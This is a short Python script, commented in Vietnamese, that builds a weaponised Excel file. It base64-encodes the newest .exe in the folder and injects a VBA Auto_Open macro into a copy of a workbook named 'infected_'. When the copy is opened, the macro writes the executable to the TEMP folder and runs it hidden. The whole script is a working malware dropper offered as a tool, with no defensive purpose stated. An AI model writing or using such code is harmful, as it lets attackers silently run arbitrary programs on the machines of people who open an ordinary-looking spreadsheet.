import os
import glob
import base64
import win32com.client
import shutil

# 🔥 Tự động tìm file EXE và Excel trong thư mục hiện tại
def find_latest_file(extension):
    files = glob.glob(f"*.{extension}")
    if not files:
        print(f"[❌] Không tìm thấy file .{extension} trong thư mục hiện tại!")
        return None
    return max(files, key=os.path.getmtime)  # Lấy file mới nhất

exe_file = find_latest_file("exe")
excel_file = find_latest_file("xlsx") or find_latest_file("xlsm")

if not exe_file or not excel_file:
    exit("[❌] Vui lòng đảm bảo có file EXE và Excel trong thư mục!")

# 🔥 Đọc và mã hóa EXE thành Base64 để nhúng vào Macro VBA
with open(exe_file, "rb") as f:
    exe_b64 = base64.b64encode(f.read()).decode()

# 🔥 VBA Macro tự động trích xuất và chạy EXE
vba_macro = f"""
Sub Auto_Open()
    Dim fso As Object, tempPath As String, exeFile As String
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    tempPath = Environ("TEMP") & "\\{exe_file}"
    exeFile = "{exe_b64}"
    
    ' Ghi EXE từ Base64 ra file
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write Base64Decode(exeFile)
    stream.SaveToFile tempPath, 2
    stream.Close
    
    ' Chạy EXE
    Shell tempPath, vbHide
End Sub

Function Base64Decode(ByVal strData As String) As Byte()
    Dim objXML As Object
    Dim objNode As Object
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("base64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    Base64Decode = objNode.NodeTypedValue
End Function
"""

# 🔥 Tạo Excel với Macro VBA
def inject_vba_into_excel():
    shutil.copy(excel_file, "infected_" + excel_file)  # Sao chép file gốc
    infected_excel = "infected_" + excel_file

    excel = win32com.client.Dispatch("Excel.Application")
    excel.Visible = False
    wb = excel.Workbooks.Open(os.path.abspath(infected_excel))
    wb.VBProject.VBComponents("ThisWorkbook").CodeModule.AddFromString(vba_macro)
    wb.Save()
    wb.Close()
    excel.Quit()

    print(f"[✅] Đã tạo {infected_excel} chứa Macro VBA tự động chạy EXE!")

# 🚀 Chạy tool
inject_vba_into_excel()
